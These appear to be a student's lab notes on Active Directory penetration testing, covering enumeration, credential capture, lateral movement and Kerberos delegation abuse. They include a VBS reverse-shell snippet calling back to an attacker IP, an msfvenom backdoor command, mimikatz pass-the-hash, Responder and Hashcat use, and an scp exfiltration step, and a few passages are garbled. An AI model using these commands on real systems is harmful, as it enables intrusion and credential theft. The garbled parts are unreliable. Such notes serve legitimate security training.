    Create a new GPO and browse to Computer Configuration, Preferences, Windows Settings. Right-click Registry, point to New, and then click Registry Item. The New Registry Properties dialog box appears. In the Hive list, click HKEY_LOCAL_MACHINE. In the Key Path list, browse to SYSTEM\CurrentControlSet\Control\Lsa.  In the Value name box, type RunAsPPL. In the Value type box, click the REG_DWORD. In the Value data box, type 00000001.Click OK.

LSA Protection prevents non-protected processes from interacting with LSASS. Mimikatz can still bypass this with a driver (“!+”).

- AD Federation Services


**(For detailed Mimikatz command reference, see Appendix A)**- AD Rights Management
- AD Lightweight Directory Services

The work of the Domain Controller (DC) in AD Domain Services is to host/installation of the Active Directory Database.

ADDS stores info about Network Objects like Users Accounts, Groups & Computers.

Active Directory is scalable to support MODs & able to Synchronize more than one Domain Controller.

Using a process known as Replication, ADDS network objects are replicated across multiple Domain Controllers.

To help ensure that users can still log on to network in the case of a server outage, Install a minimum of 2 DC for a Domain.

ADDS helps administrators securely manage the information to facilitate resource sharing & collaboration.

ADDS requires a DNS server to be installed on the network.

---

### BloodHound Attack Path Analysis Pipeline

**BloodHound** is the most powerful AD enumeration tool that maps AD relationships and identifies attack paths to privileged accounts.


*Figure: BloodHound pipeline from SharpHound collection through attack path discovery and exploitation*

---

### ORGANIZATIONAL UNITS (OUs)

Organization Units help us to Organize Active Directory objects and also apply policies.

---

### DOMAINS & TRUSTS

**Outline how the domains inside of a Forest Communicate with each other**

```
MAINDOMAIN.COM (DC)
├── FORESTS
├── DOMAIN CONTROLLER
│   └── Acts as DNS RESOLVER
├── SUB.MAINDOMAIN.COM (DC)
│   └── DOMAIN CONTROLLER
└── TREE
```

**TRUSTS:**
- **TRANSITIVE** - Similar to firewall Rules
- **DIRECTIONAL**

---

### SECURITY GROUPS

**Domain Admins**
- Has admin privileges over the domain including DC

**ENTERPRISE ADMINS**

**BACKUP OPERATORS**
- Users are allowed to access any file, ignoring other Permissions

**SERVER OPERATOR**
- User in this group can administer DCs, but can't change any administrative group membership

**ACCOUNT OPERATORS**
- User in this group can create & modify other accounts in the domain

**Domain Users**

**Domain Computers**

---

### CONTAINERS & ORGANIZATIONAL UNITS

- BUILTIN, Managed Service Accounts
- Computer, Domain Controllers, Users

---

## MODULE 2: BREACHING ACTIVE DIRECTORY (TryHackMe)

### NOTES

To Exploit A misconfig for privilege Escalation / Lateral movement; first obtain an initial set of AD Credentials.

A low-privileged Account would be sufficient; Just a way to authenticate to AD, allowing further Enumeration.

The following Techniques can be used to recover AD CREDENTIALS on Windows Networks:

- **NTLM Auth Services**
- **LDAP Bind CREDENTIALS**
- **AUTH RELAYS**
- **Microsoft Deployment Toolkit**
- **Configuration files**

NB: Windows Networks use DNS to resolve Host names.

---

### Network Connectivity Verification

Ensure AttackBox is connected to target network via operating host/server. Confirm to point/resolve the target IP.

Test connectivity after modifying Host DNS Config:
- `PING [Target IP]`
- `nslookup [Target IP] [Target DNS IP]`

**NTLM/Kerberos** - focus relies on DNS to create tickets.

DNS will be a part of Active Directory testing, because:

**Ping Network:**
- `ping target` - Verifies network is active & No response/Firewall means the network is currently blocked

**nslookup:**
- Configuring Network adds Target network DNS Address
- Confirms that the DNS server within a network is active, as the domain controller has this functionality
- A nameserver Target Domain Controller DNS SERVING Network IP is first entry

---

### Manual Linux DNS Setup

Modified in `/etc/resolv.conf`: ensure target DNS IP is first entry.

Also can go to Network Manager - Advanced Network Config → Your Connection → IPv4 Settings

Set DNS IP To Target DNS Server

Run: `sudo systemctl restart NetworkManager`; then Retest with similar approach and verify.

---

### OSINT & PHISHING

**OSINT** & **PHISHING** are 2 popular methods for gaining access to that first set of AD credentials:

- Users who ask questions on online forums but disclose sensitive Information
- Developers that upload Scripts to services like GitHub with their Hardcoded Credentials left
- Employees/users used their work accounts to sign up for other services
- Credentials exposed in past breaches since

**HAVEIBEENPWNED & DEHASHED** provide excellent platforms to determine such compromise.

**Phishing** entices users to either provide their credentials on a malicious web page or ask them to Run a specific application that would install a Remote Access Trojan (RAT) in the Background.

---

### INTERNAL RECON

**RECON-NG** is a framework that helps automate OSINT.

**ACTIVE EXTERNAL** uses modules from different authors & provide multitude of functionality.

**OSINT RECON - PASSIVE-RECON:**
- Create a workspace for your OSINT project
- RUN installed Modules - Dependencies?
- K-Requires key
- Search marketplace for Open Source modules & Install
- Set Options (Target Info & performance)
- Contains email address queries & scraped Email addresses

---

### BUILT IN TOOLS

- WHOIS
- DIG
- NSLOOKUP
- HOST
- TRACEROUTE

---

### MALTEGO

**GRAPH → TRANSFORM** (piece of code to Query an API)
- MAP ENTITY INFO-TRANSFORM ENTITY to retrieve info related to a specific entity
- Active Recon - Interactive
- SSL Certificates for domains

---

### PASSWORD SPRAYING ATTACK

BUILD PYTHON SCRIPT FOR A PASSWORD SPRAYING ATTACK:
- Take USERNAMES / PASSWORD LIST and Target Auth URL
- MONITOR DIFF IN HTTP RESPONSE CODES FROM THE URL To Determine if Credentials are valid/not
- 200 (OK) / 401

**Syntax:**
```bash
python password_spray.py -u <userfile> -f <folder> -p <password> -a <attack URL>
```

**Password Spraying Attack Decision Tree:**


*Figure: Password spraying attack decision tree with account lockout considerations and timing strategies*

---

## NTLM AUTHENTICATION


**NTLM** - Suite of Security protocols used to authenticate user's Identity in AD via CHALLENGE-Response-Based Scheme.

This authentication mechanism is heavily used by services on a network (LAN) & the following services:

- **MAIL SERVERS** That expose an Outlook Web App (OWA) login portal
- **Remote Desktop Protocol** service of a server being exposed to the Internet
- **Exposed VPN endpoints** that were integrated with AD
- **Web Applications** that are Internet-facing & make use of NetNTLM

---

### BRUTE-FORCE LOGIN ATTACK

```
CLIENT [NETNTLM] → RDP/HTTP → AD
                              ↓
                    Domain Controller
                    (Security Account Manager)
                    AUTH USERS ON BEHALF of AD
                    Prevents AD from showing credentials
                    Credentials should only be stored on the DC
```

The Domain Controller directly verifies the user's Credentials.

---

### LDAP AUTHENTICATION

**LDAP** - Similar to NTLM, however LDAP AUTH, the application centrally deployed.

Popular Mechanism used by many third party Applications that Integrate with AD like GitLab, Jenkins, printers, custom developed web apps.

---

### LDAP PASS-BACK ATTACK

Common attack against network devices when you have gained initial access to the Internal network...e.g. when we gained access to a device's Config where LDAP parameters are specified (i.e. web interface of a network printer).

We won't be able to directly extract the LDAP Credentials Since the password is hidden. However we can alter the LDAP config to point to our rogue LDAP Hostname.

By Hosting a Rogue LDAP Server & Configuring it Insecurely to ensure the Credentials are sent in plaintext.

Several ways of Hosting a rogue LDAP Server, but we use **"OPENLDAP"**:

```bash
sudo wget https://mirror.example/slapd
sudo apt-get update && apt-get install slapd
sudo systemctl enable slapd
```

Next we Reconfigure the Rogue server to run securely:
```bash
sudo dpkg-reconfigure -p low slapd
```

Configuration steps:
- Skip Server Config
- Provide any Admin password
- Select MDB as the LDAP DB
- Ensure DB is purged
- Provide password
- Domain name
- Use same name for Organization
- Move old DB files

---

### Downgrade Rogue LDAP server to insecure supported Auth mechanism

Supports only PLAIN AND LOGIN Auth - Target DNS Server

Create a new `.ldif` file like `saslsecprops.ldif` (specifies the SASL Security properties) & load data using:

```bash
sudo ldapmodify -Y EXTERNAL -H ldapi:/// -f /oldsaslsecprops.ldif
```

LDIF Interchange format to patch LDAP Server min SSF (specifies the minimum acceptable security strength):
- 0 = No protection
- No anonymous (Disables Mechanisms that support anonymous login)

**Restart Service:**
```bash
sudo service slapd restart
```

**LDAP SEARCH TO VERIFY SUPPORTED AUTH MECHANISMS:**
```bash
sudo ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

**CAPTURE LDAP CREDENTIALS:**
```bash
sudo tcpdump -SX -i <interface> tcp port 389 -w ldap.pcap
```

See the LDAP exchange between the Rogue LDAP server (port 389) - command to check our Rogue Server (only)

---

## AUTH RELAYS


**AUTH RELAYS** - Intercepting Authentication Communication mechanism between Windows Network devices, due to flaws in auth methods to verify the identity of incoming connections in NetNTLM auth used by SMB.

In Microsoft AD, SMB governs everything from inter-network file-sharing to Remote Administration.

We can use our Rogue LDAP server to stage a man-in-the-middle attack, relaying the SMB Authentication between client & server (Kali/Metasploit).

NTLM challenges can be intercepted. Use of offline Cracking techniques to recover the password associated with NTLM challenge. However, this cracking process is significantly slower than cracking when hash is directly available, which will provide us with an active authenticated session and access to the Target server.

---

### RESPONDER

Look at the AUTH that occurs during the use of SMB. We will use **RESPONDER** to Intercept NetNTLM challenge.

**Config:** `/etc/responder/Responder.conf` on servers to listen.

**RESPONDER** - Allows us to perform MITM by poisoning the responses during Network Authentication, tricking the client into talking to you Instead of the actual server they wanted to connect to.

On a Real LAN, one would try to find a proxy for future HTTP connections.

---

### LLMNR & NBT-NS

**(LLMNR) LINK-LOCAL MULTICAST NAME RESOLUTION** & **NetBios Name Service (NBT-NS)** using the **Web-proxy Auto-Discovery (WPAD)** requests.

These protocols rely on requests broadcast on the local network; Our Rogue device then with the help of Responder will actively listen to the requests & send poisoned responses telling the Host that our IP is associated with the Requested Rogue LDAP server hostname there.

The Hash (NTLMv2-SSP) obtained by Responder to a Hash file is proceed to cracking with password list.

**NTLMv2-SSP Hash** uses Hashcat hash type 5600.

**Hashcat** is preferable for Comparison of the captured hash == password detected in wordlists.

Client to connect to our Attack Box.

**Hashcat Syntax:**
```bash
hashcat -m 5600 -a 0 hashes.txt wordlist.txt
```

Mode 5600 → NTLMv2-SSP protocol

---

## MICROSOFT DEPLOYMENT TOOLKIT (MDT)

**MICROSOFT DEPLOYMENT TOOLKIT (MDT)** - Assists with automating Deployment of Microsoft OS.

Usually Integrated with System Center Configuration Manager (SCCM).

**SCCM** manages all updates for Microsoft Apps, services & OS:
- **MDT** - allows IT Team to preconfigure & manage boot images & ensure the OS build is updated before Installation
- **SCCM** - patch management; allows IT Team to review available updates to all software installed across the network

MDT & SCCM can be exploited via various methods.

---

### PXE BOOT IMAGE RETRIEVAL

**PREBOOT EXECUTION ENVIRONMENT (PXE BOOT)**

Large Orgs use PXE boot to allow new devices that are connected to the network to load & Install the OS directly over a network connection.

MDT can be used to create, manage & host PXE boot Images.

PXE boot is usually integrated with DHCP (Assigns IP lease).

We would attempt to Recover the Deployment service account associated with the MDT service during Installation.

---

### STEPS:

**STEP 1:** Recover PXE Boot preconfig via DHCP

**STEP 2:** Recover names of BCD files (store Boot Devices, Info relevant to PXE Boots for different architecture)

**STEP 3:** Download BCD files to read the Configuration of the MDT server located in `/tmp/` Directory

**STEP 4:** Use TFTP to send a file request; the server will connect back to us via UDP to Transfer

**STEP 5:** With the BCD files Downloaded, we now use **POWERPXE** to read its contents

Use the `Get-WimFile` function of PowerPXE to recover the locations of the PXE Boot Images.

**Syntax:**
```powershell
Get-FindCredentials -WimFile <\preboot.wim>
```

**WINDOWS IMAGE FILE - WIM** - Identify WIM File

Powershell script that automatically performs this type of attack but usually with varying results, so it's best to perform a manual approach.

Likewise WIM Injection attack is a privilege escalation Vector for 1.2 Local Admin Account to gain Admin - a password Scraping Attack.

---

## MODULE 3: ENUMERATING ACTIVE DIRECTORY

**Date: 08/02/25**

### NOTES

**OBJECTIVE:**

```
INITIAL RECON → INITIAL Compromise → ESTABLISH FOOTHOLD → ESCALATE PRIVILEGE
                                    ↓
                              INTERNAL RECON
                                    ↓
                         MOVE LATERALLY ← ACHIEVE ACTION
                                    ↓
                            MAINTAIN PRESENCE
```

After Breaching AD & gaining a set of CREDENTIALS (FOOTHOLD) & a means to authenticate within the network, we can start enumerating various Details about the AD Setup and structure with Authenticated access & low privilege access.

In Security assessments, you will often have Network access & recovered Initial AD Credentials but have no means/privilege to create a new Domain-Joined machine.

---

### CREDENTIAL INJECTION

**runas.exe** - Inet only - `user:<domain\username>`

Not only allows users to run a program under a different user; `user:<domain\username>`

Inet only option as we are not Domain-Joined.

If you use your own Windows Machine:
- Ensure to Run your first Command prompt as Admin
- This injects an Admin token into `cmd.exe`
- This Token does not give Admin privilege over computer
- Any command you execute will execute with administrator privileges

To use those Credentials & gain the ability to enumerate AD on a Windows machine we control:

**WIN/LINUX:**

We use **RUNAS** (a legacy Windows binary) to Inject the credentials into memory by SPAWNING a WINDOW that is Accessible by any AUTH AD Account.

```cmd
runas.exe /netonly /user:<domain\username> cmd.exe
```

**Parameters:**
- `/netonly` - Only use credentials for network authentication
- `/user:` - User's domain; use FQDN not NetBIOS name
- `cmd.exe` - program to execute once Credentials loaded

After providing password, verify credentials by accessing `sysvol`.

---

### SYSVOL Folder

**SYSVOL** Folder exists on all Domain Controllers - a Shared folder storing Group Policy Objects & information that ensures any local command prompt will use our Injected Credentials for authentication.

Essential component as it delivers GPO to all PCs.

Remember to Configure DNS from Attack Box/Host. Safest bet is DNS Server is usually Domain Controller.

**Syntax:**
```cmd
dir \\<FQDN>\sysvol
```

With `/netonly` option, all network communication INCLUDES ALL NET Communication of Apps Executed will use our Injected Credentials for authentication.

**Note:** Providing Hostname, network Auth will attempt to first perform Kerberos Auth. Since Kerberos uses Hostnames embedded in tickets, if we provide the IP address Instead, we force Auth to use NTLM type.

---

### Enumeration via Microsoft Management Console (MMC)

**Enum via Microsoft Management Console [MMC]** - RUNAS ensures all MMC network communication will use starting MMC using previous credential injection.

The GUI Active Directory requires RDP access to the machine where AD is executed. Else use alternative methods.

Although Searching for an object is fast, gathering AD-wide properties or attributes can't be done efficiently.

---

### Enumeration Via COMMAND PROMPT

**Enum Via COMMAND PROMPT** - "Handy when access to RDP is not available". CMD has a Built-in Command that we can use to enumerate Information about the AD; **"Named NET"**

**Commands:**
```cmd
net user <username> /domain                    # Enumerate more details about a user
net user /domain                               # List all users in the AD domain
net group /domain                              # List all groups
net group "Group 1" /domain                    # Shows Group Members - more detailed information about a particular group
net accounts /domain                           # Enum the password policy of the domain
```

**Password Policy Information:**
- Length of password history
- Lockout threshold
- Minimum length
- Maximum Age

Information Enumerated from the sub-option `accounts` can be used to perform additional password spraying against other users we enumerated.

**Must be executed from Domain-Joined machines.**

---

### Enumeration via PowerShell

**Enum via PowerShell** - Upgrade to complete tools (cmdlets) Classes to perform Specific Function.

**PowerShell AD-RSAT Cmdlets:**

```powershell
Get-ADUser -Identity <username> -Properties * -Server <FQDN>  # Identify AD Users
Get-ADUser -Filter *                                          # Enumerate All Users

Get-ADGroup -Identity <groupname> -Server <FQDN>              # Enumerate AD Groups/Units
Get-ADGroupMember -Identity <groupname>                       # Enumerate AD Group Membership

Get-ADDomain                                                  # Retrieves Additional Info about Specific Domain

Get-ADObject -Filter *                                        # Generic Search for AD Objects
```

With Additional parameters, we can Enumerate more details regarding Specific users & Security.

These parameters/options can be made powerful as monitored by Blue-team: `-Filter`

**PowerShell Unlike CMD and Net Command**

Installing AD-RSAT Tool is Detectable.

---

## BLOODHOUND (Microsoft AD Enumeration)

**Date: 09/02/25**

### NOTES

**INSTALL BLOODHOUND & NEO4J on AttackBox**

Neo4j is Neo4j Backend Database & Graphing System.

**Run:**
```bash
neo4j console start  # Separate Terminal
```

Access GUI: `https://bloodhound.readthedocs.io`

```bash
bloodhound --no-sandbox
```

**BLOODHOUND** - A map of AD/Attack Paths

**SHARPHOUND** - THINK GRAPH LIKE: Lists, Nodes, Edges

Actual GUI allows Importation of data captured by SharpHound and visualize it into Attack paths.

Bloodhound allows attackers (RED-TEAM) to visualize the AD Environment in graph format with Interconnected nodes. Each connection is a possible path that could be exploited to achieve goals & Objectives. Understand Security Posture.

---

### STAGES:

**STAGE 1:** Perform phishing Attack to obtain Initial entry to enumerate AD Info (detected), exfiltrate enumerated data & upload to create an Attack path in graph format; showing precisely steps/hops required.

**STAGE 2:** Use Attack path.

Might raise alerts. Evade on-disk AV Scans.

**SharpHound** - the enumeration tool of Bloodhound Project - used to enumerate the AD Info - visually displayed in Graph.

**Executables:**
- `SharpHound.exe`
- `SharpHound.ps1` - Good to use with AMSI
- `AzureHound.ps1` - Enums Azure cloud environments

**NB:** Your Bloodhound && SharpHound Versions must match for best results. Check version of SharpHound before Enumeration.

Bloodhound can Ingest data enumerated from Azure cloud environments to find attack paths related to AZURE IAM.

Using Collector Scripts on assessment, there is a high likelihood that these files will be detected & raise an alert.

---

### Bypassing Detection

We Use our Windows Machine that is not domain-joined to bypass (Use RUNAS cmd to Inject AD Credentials & point SharpHound-Data).

**Enumeration Options** → Takes Time like Complex Nmap Scans. However can be fine-tuned with better skill level.

**Collection Methods:**
```
-c | --CollectionMethod    # Default / ALL / DCOnly (Computers Only / Session / LoggedOn)
--Domain <Domain>
--Stealth
--SearchBase "OU"
--ExcludeDCs
--RealDNSName <DNS Servers>
```

Less Common Collection Methods: `Group | ACL | GPOLocalGroup | Trusts | Container | LocalGroup | LocalAdmin`

After Enumeration with SharpHound, Remember to use SCP command to exfiltrate recovered Data from Connected Target:

```bash
scp <AD Username>@<Domain>:C:/Users/<AD Username>/Documents/sharphound.zip .
```

Requests AD user password.

---

### BloodHound Information Provided:

- Overview
- Node Properties
- Group Membership
- Execution Outbound Rights

Each Icon Corresponds to an AD-Object & lines Interconnecting nodes are called **EDGES** which could be filtered.

**<NODE> → Local Admin Rights**

The Structure of AD Doesn't change often in large Orgs; Overall structure of OUs, Groups, Users, Permissions remain Same. However active Sessions & Logon Events change constantly and requires SharpHound ran at regular Intervals.

**Clear Session Info in Bloodhound before Importing data from SharpHound** to clean stagnant session data.

**NB:** BloodHound can be Run from our AttackBox.

---

## OTHER ACTIVE DIRECTORY ENUMERATION TOOLS

**LDAP ENUMERATION:**
- Framework Allows you to write LDAP Search queries to enumerate Info

**POWERVIEW** (Recon Script) from PowerSploit

**MITIGATIONS:**
- Difficult to distinguish malicious enumeration traffic from normal traffic
- Block/Detect multiple Login Events as tools like SharpHound generate Suspicious Login Events
- Write Sysmon/detection rules for the tools that must be installed for specific AD admin tasks
- Detect Unauthorized use of CMD & PowerShell commands to detect potential Enumeration attempts

**Windows Management Instrumentation (WMI):**
- Enumerates Info from Windows Host
- Providers in `root/directory/ldap`
- To Interact with AD, we use WMI provider in PowerShell

Familiarize Yourself with Techniques & Tools. Different attempts with material to move laterally & persist.

---

## MODULE 4: LATERAL MOVEMENT & PIVOTING

**Lateral Movement Techniques Comparison:**


*Figure: Lateral movement techniques comparison showing requirements, methods, advantages, disadvantages, and detection indicators*

---

Under Certain Conditions/Circumstances, An attacker Can take advantage of actions Performed by users to gain further access to machines in the network.

---

### ABUSING USER BEHAVIOUR

**ABUSING WRITABLE SHARES:**

If a network share is writable for some reason, attackers can plant specific files to force users into executing arbitrary Payloads & gain access to their machines.

**Simple Scenario:** Admin can maintain an executable on a network share, thereby allowing users to execute it without copying/installing the application to each user's machine.

Although Scripts/executables are hosted on a network share server, when a user opens the SHORTCUT on their workstation, the script/executable will be copied from the Server to the User's Temp folder & executed.

Therefore any payload will run in the Context of the final user's machine & logged-in user Account privilege.

---

### BACKDOORING VBS SCRIPTS

If the shared Resource is a VBS Script:

We can put a copy of `nc64.exe` on the same share & Inject code that will copy `nc64.exe` from the Share to the user's workstation `%tmp%` & send a Reverse shell back to the attacker whenever a user opens the shared VBS Script.

**Example VBS Code:**
```vbscript
CreateObject("WScript.Shell").Run "cmd.exe /c copy \\<Network Share>\<Share Directory>\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <AttackBox IP> 1234", 0, True
```

---

### BACKDOORING EXE Files

If the shared resource is a Windows OS binary:

You can download it from the share & use `msfvenom` to Inject a backdoor Into it.

The binary will still work as usual but executes an additional payload quietly/silently.

The resulting binary will execute a Reverse TCP meterpreter payload Silently.

Replace the Original binary & wait for Connection using metasploit multi/handler.

**msfvenom Syntax:**
```bash
msfvenom --platform Windows -x <Binary.exe> -k -p windows/meterpreter/reverse_tcp LHOST=<AttackBox IP> LPORT=<port> -b "\x00" -f exe -o <NewBinary.exe>
```

---

## Windows Management Instrumentation (WMI)

**Windows Management Instrumentation (WMI)** → Remotely Allows Administrators to perform standard management tasks.

**Protocols:**
- **DCOM:** RPC [135/tcp][49152-65535/tcp]
- **WSMAN:** WinRM [5985/tcp]

**WMI Remote Execution Flow:**


*Figure: WMI remote execution sequence showing four execution methods and detection points*

---

### Creating WMI Session

1. Create a PowerShell Credential Object on Compromised Target
2. Establish a WMI Session using either DCOM/WSMAN

We create a WMI session by storing our created session variable.

The `New-CimSessionOption` cmdlet is used to config the connection options for the WMI Session, including the connection protocol.

The Connection type/option & Credentials are then passed to `New-CimSession`.

---

### Remote Process Creation using WMI

We can remotely Spawn a process from PowerShell by leveraging WMI, Sending a WMI request to the `Win32_Process` class to spawn the process under the WMI session created.

---

### Creating Services Remotely with WMI

Create Services with WMI in PowerShell using the `Invoke-CimMethod` Using our payload as its Arguments.

---

### Creating Scheduled Tasks Remotely with WMI

Using PowerShell Cmdlets.

---

### Installing MSI packages through WMI

**MSI File** - File format used for Microsoft Installers.

We try to use WMI to attempt to install a malicious MSI package.

The malicious `.msi` can be copied to Target; we then attempt to Install it by invoking the `Win32_Product` class via WMI.

---

### STEPS Involved in moving laterally to another host using WMI, MSI:

1. Create a `.msi` malicious payload using `msfvenom` from AttackBox
2. Copy our payload using SMB / any other file transfer available
3. RUN metasploit multi/handler to listen & handle Incoming connections
4. Start a WMI Session against Target from a PowerShell console

We can equally start a process remotely using any of the above methods.

Invoke the Install method from `Win32_Product` class to trigger the payload & Receive the Connection.

---

## RDP HIJACKING

**RDP HIJACKING:** Un-logged-off RDP Sessions can be hijacked by closing/quitting an RDP client without logging off; the Session will remain open on the server Indefinitely.

**Steps:**
1. RUN `cmd.exe` as Admin on Initial Compromised admin-level host
2. RUN `PSEXEC64.exe`
3. List the existing sessions on a server with the following command:
   ```cmd
   query user
   ```
   **Disc** state Implies RDP Session left Open

**Do not take over active sessions, as user will be forced out (noticeable)**

To connect to a Session, we will use **TSCON.EXE**

---

## USE OF ALTERNATE AUTHENTICATION MATERIAL


This process applies when using a Domain Account & Local Account.

---

### NTLM AUTHENTICATION FLOW

```
1. AUTH Request
   CLIENT → SERVER

2. NTLM Challenge
   SERVER → CLIENT

3. NTLM Response
   CLIENT → SERVER
   (Challenge + Response Hash + NTLM Challenge)

4. Verification
   SERVER → Domain Controller
   Allow/Deny AUTH
```

**NTLM Hash + CHALLENGE:**

The DC uses the challenge to recalculate the response and Compares it to the Initial response sent by the client.

**Response = Response?** - NetNTLM v2 Challenge+response is a String formatted to include Challenge & response.

- If a local account is used, the server verifies the response without requiring Interaction with DC as CREDENTIALS Hash are in SAM DB.

---

### PASS-THE-HASH (PTH)

Instead of Cracking NTLM Hashes extracted; if the domain is configured to use NTLM Auth, we can just Pass-The-Hash (PTH) to authenticate Successfully.

To extract the Hashes, Extract directly from **Local Security Authority Subsystem Service (LSASS Memory)**.

#### Mimikatz SEKURLSA::Pth Command

The `sekurlsa::pth` module enables Pass-the-Hash attacks by injecting NTLM hashes into new processes without requiring plaintext passwords.

**Basic Syntax:**
```cmd
mimikatz # sekurlsa::pth /user:<username> /domain:<FQDN> /rc4:<NTLM_hash> /run:cmd.exe
```

**Key Parameters:**
- `/user` – Username to impersonate
- `/domain` – Fully qualified domain name
- `/rc4` or `/ntlm` – NTLM hash of target user's password
- `/run` – Command to execute in the new process (default: cmd.exe)

**(See Appendix A for complete SEKURLSA::Pth parameter documentation and advanced options)**

**Pass-the-Hash Attack Flow:**


*Figure: Pass-the-Hash attack bypasses password requirement by using NTLM hash directly for authentication*

**Use MIMIKATZ:**
- To read the Local SAM database of Target
- To Inject an access token for the Victim user on a reverse shell

**Notice:** The use of `token::revert` to reestablish our original Token privileges. Trying a PTH attack with an elevated token won't work - equivalent of using RUNAS `/netonly` but with hash instead of password.

**Protocols that support PTH:**
- Connect via `psexec` using PTH
- Connect to RDP using PTH
- Connect to WinRM using PTH

---

### PASS-THE-TICKET (PTT)

**KERBEROS:**

Research Diagram. `klist` Cmd to list Kerberos Tickets.

**Kerberoasting Attack Flow:**


*Figure: Kerberoasting attack sequence showing TGS ticket request and offline password cracking*

**mimikatz.exe** - Credential Dumper

**BOTH TGT & TGS are Necessary:**

If we had System privilege on a target machine, we could easily extract Kerberos tickets & Session keys from LSASS memory using mimikatz.

We are Interested in **TGTs** as they can be used to request access to any services the user is allowed to access.

**TGSs** are good for specific services; Therefore extracting TGT requires Admin privilege. Extracting TGS can be done with a lower-privileged Account.

Once we extracted TGT, we Inject the tickets Into the Current logged-in session with Mimikatz and access.

---

### OVERPASS-THE-HASH / PASS-THE-KEY

**PTH is Similar to PTH but applies to Kerberos networks.**

When a user requests a TGT, they need to Send a Timestamp encrypted with an Encryption Key derived from their password.

The algorithm to derive this Keys can be either:
- **DES** (disabled by default)
4**
- **AES128/256**

Depending on Windows Version & Kerberos Configs.

We can use mimikatz to obtain the keys from memory, therefore we can ask the Kerberos Domain Controller (KDC) for a TGT without requiring the actual password, hence the name **Pass-THE-KEY (PTK)**.

We can proceed to getting a Reverse shell via Pass-the-key.

---

## PORT FORWARDING VIA SSH TUNNELLING

**Date: 14/02/25**

### NOTES

**PROXYCHAINS & CHISEL**

For Security Reasons, in the real world networks, admins may Block ports.

To go around Several blocked/closed ports [SMB, RDP, RPC, WINRM], we use port forwarding techniques which consist of using any Compromised host as a Jump Box to pivot to other hosts.

---

### SSH TUNNELLING

**SSH Remote port forwarding** & **SSH Local port forwarding**

Let's assume a Scenario where we've gained Control of PC-1 machine (doesn't need to be Admin access) & we would like to use it as a pivot to access a port of another machine that we can't directly connect to.

We start a Tunnel from Compromised PC-1, acting as an SSH client, to our Attack Box (act as SSH Server); also Let's create a user on our AttackBox without access to any console for Tunnelling only.

Set a password to use for creating the Tunnels. Depending on your needs, the SSH tunnel can be used for either Remote/Local port forwarding.

---

### SSH REMOTE PORT FORWARDING

```
AttackBox          PC-1              Server
1.1.1.1         2.2.2.2          3.3.3.3
SSH-Server      SSH-Client
22:80           22:80:3389       445:3389

SSH TUNNEL Remote Forwarding
```

---

### SSH LOCAL FORWARDING

```
AttackBox          PC-1              Server
1.1.1.1         2.2.2.2          3.3.3.3
SSH-Client      SSH-Server
22:80:3389      22:80            445:3389

SSH TUNNEL Local Forwarding
```

---

## EXPLOITING ACTIVE DIRECTORY

**Date: 17/02/25**

### MODULE 5: AD NOTES

---

### Active Directory Concepts

**Directory Replication Services** - provides an API to facilitate Replication of Objects between Domain Controllers.

**Microsoft Azure:**

"Azure AD Connect" is a Microsoft Tool to Synchronize On-premise AD environment to cloud Azure AD Environment.

The name of the Service Responsible for syncing the local AD to AZURE AD is **Microsoft AZURE AD Connect**.

Enables Integration & management of Identity Information across multiple directories, platforms and platforms.

**GPO [Group Policy Template + Group Policy Containers]** stored on DC; the former is stored in SYSVOL of each DC on the Domain Forest.

SYSVOL is automatically synchronized & shared/Replicated among all Domain Controllers.

**SYSVOL** is an essential component of Active Directory & Creates a shared Directory on an NTFS Volume that all authenticated domain users can access with Reading Permissions.

---

### Security Account Manager (SAM)

**SECURITY ACCOUNT MANAGER [SAM]** is Windows Database for storing Local Account Info, Passwords & Hashes.

---

### LSASS

**LSASS: Local Security Authority Subsystem Service** - A Windows Process that handles the OS Security Policy & enforces it on a system.

It verifies logged-in Accounts, ensures passwords, hashes & Kerberos tickets.

Windows Systems stores Credentials in the LSASS process memory to enable users to access network resources without re-entering Credentials every time (SSO).

Commonly abused to dump Credentials from the Process Memory to either escalate privilege, steal data, move laterally.

Read Mitre attack on OS Credential dumping: LSASS Memory.

---

### Kerberos Delegation

A ticket has me found on the Resources it can access on behalf of a user who is authenticated, as long as the user has that delegating ticket.

---

## 1.0 Exploiting Permission Delegation ATTACKS

**Permission Delegation** in AD is a feature that allows delegation of permissions & privilege.

To keep Delegation Secure, the principle of least privilege should be followed & Observed.

Almost any AD object can be secured with **ACE: Access Control Entries** that populates **Discretionary Access Control Lists (DACL)** - describe the allowed & denied permissions of AD objects.

A significant amount of Access Control entries could be misconfigured - look for each directory to make Requests. Our best options vary on breach by detection tools in the environment.

---

### ACE Types

- **FORCE CHANGE PASSWORD** - ability to change user's password
- **ADD Members** - ability to add users to any target group
- **ALL Extended Rights** - ability to perform any action associated with extended AD rights against Target object
- **Generic ALL** - Complete Control over target Object
- **Generic Write** - ability to write to/update any properties/non-protected parameters of target object
- **Write Owner** - ability to update the owner of object
- **Write DACL** - ability to write new Access Control entries to the target object's Discretionary Access Control List

**Admin SDHolder Propagation Timeline:**


*Figure: Admin SDHolder 60-minute propagation cycle and persistence strategies exploiting the timing window*

---

### Interaction Methods

In Order to exploit ACE, we will need to Interact with Active Directory using:
- AD-RSAT PowerShell Cmdlets
- PowerSploit

Depending on detection tools in the environment.

---

## 2.0 Exploiting Kerberos Delegation

**Kerberos Delegation** in AD is a feature that enables an application to access resources hosted on a different server.

Example: A Web Server needing access to SQL DB hosted on the database Server for the Web application that is hosting.

Without Kerberos Delegation, we would probably need to create an AD Service Account & provide it access to the Database.

Since the delegated account can't just be used everywhere, Microsoft has implemented different types of Delegations:

---

### UNCONSTRAINED Kerberos Delegation (KD)

**Unconstrained KD** - Least secure, provides no limit to the delegation.

Such that, if a User with "Trusted for Delegation" flag set (1) TRUE authenticates to a host with Unconstrained Delegation enabled, a TGT is generated for that user & stored in memory.

Suppose we Compromise the host, We can attempt to force a privileged Account to authenticate to the host.

This allows us to Intercept the generated TGT.

---

### Steps to Exploit Unconstrained K.D:

1. Identify the Servers with Unconstrained Delegation

   ```powershell
   Get-ADComputer -Filter {TRUSTEDFORDELEGATION -eq $TRUE}
   ```

2. Compromise one of the servers
3. Use Spool Sample to force the DC to Authenticate to the Compromised Host
4. Extract the DC's TGT from LSASS memory of Compromised Host
5. Inject the TGT Into the Current Compromised Host low privilege context

---

### How Can we force a Connection to a server with Unconstrained KD?

- Responder - force the connection
- DNS poisoning - Rogue DHCP
- PrinterBug / SpoolSample

Service Accounts services on a Server get Different delegation models.

---

### CONSTRAINED KD

